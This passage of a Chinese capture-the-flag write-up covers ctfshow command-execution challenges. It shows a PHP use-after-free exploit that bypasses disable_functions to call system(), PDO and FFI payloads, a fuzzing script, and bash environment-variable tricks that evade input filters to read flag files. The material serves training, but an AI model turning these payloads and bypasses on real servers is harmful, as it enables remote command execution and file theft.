invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意传入时省略<?php ?>以及进行url编码</p><h2 id="73-74-web73-74">73-74.web73-74</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>利用上一题的payload打一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">error_reporting</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">14</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">ini_set</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">15</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">strlen</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">19</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code on line 154</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Warning: strlen() has been disabled for security reasons in /var/www/html/index.php(19) : eval()&#x27;</span>d code on line <span class="number">154</span></span><br><span class="line">UAF failed</span><br></pre></td></tr></table></figure><p><em>报错<code>strlen()</code>函数被禁用,我们可以自定义函数替代</em></p><blockquote><p>实测题目环境会将更改后的脚本流量洗掉导致502，建议使用非预期解</p></blockquote><p>首先还是用上一题脚本查看目录，发现flag文件变为<code>flagc.txt</code>可能因为放开了open_basedir的限制，导致常规姿势可以使用<br>payload：<code>c=include(&quot;/flagc.txt&quot;);die();</code></p><h2 id="web75-76">web75-76</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>还是先用glob协议查看根目录发现<code>/flag36.txt</code><br>利用一下包含和UAF发现都被过滤<br><s>不会，查看hint</s><br>这时可以使用PDO（PHP Data Objects）是一种在PHP里连接数据库的使用接口<br>通过mysql load_file来读取文件来读文件绕过open_basedir和disable_function<br>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]) . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>73同理只不过flag位置改变</p><h2 id="web77">web77</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行最后一题，php7.4，基本上命令执行就告一段落了</strong></p><h3 id="解题思路">解题思路</h3><p>先扫目录发现<code>/flag36x.txt</code>和<code>/readflag</code>，利用上一题的payload打一下<br>报错<code>could not find driver </code>,描述中提示是php7.4版本<br>7.4以上的php版本可以使用FFI，即外部函数接口，是指在一种语言里调用另一种语言代码的技术<br>PHP的FFI扩展就是一个让你在PHP里调用C代码的技术</p><p>可以通过FFI来实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后直接访问这个文本文件即可</p><p>构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 上面第一句表示创建一个system对象</span></span><br><span class="line"><span class="comment">// 第三句通过$ffi去调用system函数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者用这个：</span></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; 1.txt&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web118-环境变量拼接">web118  --环境变量拼接</h2><h3 id="题目描述">题目描述</h3><p><strong>flag in flag.php</strong></p><h3 id="解题思路">解题思路</h3><p>尝试一些基本命令发现全返回evil input，查看注释发现执行<code>&lt;!-- system($code);--&gt;</code><br>可以写一个Fuzz脚本看看都过滤了什么</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://fad0c7d5-98ef-4c7c-86c9-08f357e427a0.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters+string.digits+<span class="string">&quot;$+-&#125;&#123;_&gt;&lt;:?*.~/\\ &quot;</span></span><br><span class="line">white_list = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;code&quot;</span> : payload</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;evil input&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(payload, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        white_list += payload</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(white_list.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;空格&quot;</span>))</span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ$&#125;&#123;_:?.~空格</span></span><br></pre></td></tr></table></figure><p>根据描述，flag在flag.php中，我们可以根据环境变量拼接构造出<code>nl</code>指令读取<br>环境变量用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$PWD和$&#123;PWD&#125;    表示当前所在的目录   /var/www/html</span><br><span class="line">$&#123;#PWD&#125;                 13                          前面加个#表示当前目录字符串长度</span><br><span class="line">$&#123;PWD:3&#125;              r/www/html                  代表从第几位开始截取到后面的所有字符（从零开始）</span><br><span class="line">$&#123;PWD:~3&#125;        html                             代表从最后面开始向前截取几位（从零开始）</span><br><span class="line">$&#123;PWD:3:1&#125;          r</span><br><span class="line">$&#123;PWD:~3:1&#125;        h</span><br><span class="line">$&#123;PWD:~A&#125;           l                               这里的A其实就是表示1</span><br><span class="line">$&#123;SHLVL:~A&#125;        1                              代表数字1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 利用各个环境变量的最后一位来构造命令</span><br><span class="line">$&#123;PWD&#125;表示当前所在的目录</span><br><span class="line">一般的话都会是/<span class="keyword">var</span>/www/html</span><br><span class="line">$&#123;PATH&#125;表示文件位置相关的环境变量</span><br><span class="line">基本上指的是根目录下的bin目录</span><br><span class="line">即：/<span class="keyword">var</span>/www/html <span class="comment"># ls /bin</span></span><br><span class="line"></span><br><span class="line">那么$&#123;PWD:~A&#125;的结果就是字母 l</span><br><span class="line">而$&#123;PATH:~A&#125;的结果是字母 n  </span><br><span class="line">这里的~A代表是最后一位字符，相应B就是导数第二位字符。同样数字的话<span class="number">0</span>就是最后一位字符</span><br><span class="line">它们拼接在一起正好是nl，能够读取flag，因为通配符没有被过滤，所以可以用通配符代替flag.php --&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;$&#123;IFS&#125;????.???</span><br><span class="line">要不，直接输入到框里回车也行，这边是随便输入了一个值用bp抓包后看到参数传递形式是POST才知道用POST传参的</span><br><span class="line"></span><br><span class="line">当然这题还有其他payload：</span><br><span class="line">$&#123;PATH:$&#123;<span class="comment">#HOME&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;$&#123;PATH:$&#123;#RANDOM&#125;:$&#123;#SHLVL&#125;&#125;??.???</span></span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PATH:$&#123;<span class="comment">#TERM&#125;:$&#123;SHLVL:~A&#125;&#125; ????.???</span></span><br></pre></td></tr></table></figure><h2 id="web119">web119</h2><h3 id="题目描述">题目描述</h3><p><strong>flag in flag.php</strong></p><h3 id="解题思路">解题思路</h3><p>在上一题基础上过滤了PATH和BASH,核心思路依然是环境变量拼接</p><p>预期解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125;     ====&gt;   t</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;Z&#125;:$&#123;#SHLVL&#125;&#125;    ====&gt;   /</span><br><span class="line"></span><br><span class="line">/bin/cat flag.php</span><br><span class="line"></span><br><span class="line">$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;???$&#123;PWD:$&#123;#&#125;:$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.???</span><br></pre></td></tr></table></figure><p>非预期解：</p><p>可以尝试构造 /bin/base64 flag.php 这个命令，只需要 / 和 4 两个字符就可以了，其他的率可以用通配符来代替</p><p>对于 / 的话其实很简单，PWD，即 /var/www/html 的第一个就是，即构造为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::1&#125;</span><br></pre></td></tr></table></figure><p>但是1是不能使用的，这就可以用到SHLVL：<br>作用：记录多个 Bash 进程实例嵌套深度的累加器，进程第一次打开shell时 ${SHLVL} 就为1，然后再这个shell中再打开一个shell的话此时 ${SHLVL} 就变成了2</p><p>不能使用数字的话，就可以使用这个来代替：<br>/ 的构造变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;SHLVL&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">然后就需要构造 4 这个字符了，这里可以使用RANDOM</span><br><span class="line"></span><br><span class="line">RANDOM是一个变量值，随机出现整数，范围为：0~32767</span><br><span class="line">虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样</span><br><span class="line">如果需要每次产生的随机数顺序不一样的话，可以在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子</span><br><span class="line"></span><br><span class="line">回到构造 4 这个字符上，再Linux中，$&#123;#xxx&#125;显示的是这个数值的位数，而如果不加 # 的话就是显示这个数原本的值，比如12345再加上#后就是5</span><br><span class="line">在RANDOM中产生的随机数可以是1、2、3、4、5这个5个数，但1，2，3这三个出现的概率很低，所以基本上是4或5，因此如果要使用RANDOM的话其实也有碰运气的成分在里面，没准就撞到了正确的数</span><br></pre></td></tr></table></figure><p>构造4：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#RANDOM&#125;// 也有可能是1、2、3、5，多试几次应该还是能成的，不然就是你太背了</span><br></pre></td></tr></table></figure><p>知道两个字符的构造后，进行命令的整体构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125;$&#123;IFS&#125;????.???</span><br><span class="line">/bin/base64 flag.php这里其实$&#123;IFS&#125;可以不用直接用空格，因为没禁</span><br></pre></td></tr></table></figure><h2 id="web120">web120</h2><h3 id="题目描述">题目描述</h3><p><strong>flag in flag.php</strong></p><h3 id="解题思路">解题思路</h3><p>终于给出了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>多过滤了HOME且payload长度不超过64<br>简单把${IFS}换成空格就可以了<br>我们也可构造其他函数如<code>/bin/cat flag.php</code><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br></pre></td></tr></table></figure><h2 id="web121">web121</h2><h3 id="题目描述">题目描述</h3><p><strong>师傅们 留口饭吃</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">把我们的SHLVL和~给过滤了，我们可以用$&#123;#?&#125;代替</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="line">/bin/base64 flag.php</span><br></pre></td></tr></table></figure><p>我们也可构造<code>/bin/rev</code><br>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;??$&#123;PWD:$&#123;#?&#125;:$&#123;#?&#125;&#125; ????.???</span><br><span class="line">即code=/???/??v ????.???</span><br><span class="line"></span><br><span class="line">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????.???</span><br><span class="line">即code=/???/r?? ????.???</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web121">web121</h2><h3 id="题目描述">题目描述</h3><p><strong>师傅们 留口饭吃</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="title function_ invoke__">system</span>(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了<code>PWD</code>、<code>#</code>但放出了<code>HOME</code></p><p>需要说明的是：/ 可以通过 HOME 获取，需要数字1，但 # 也被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 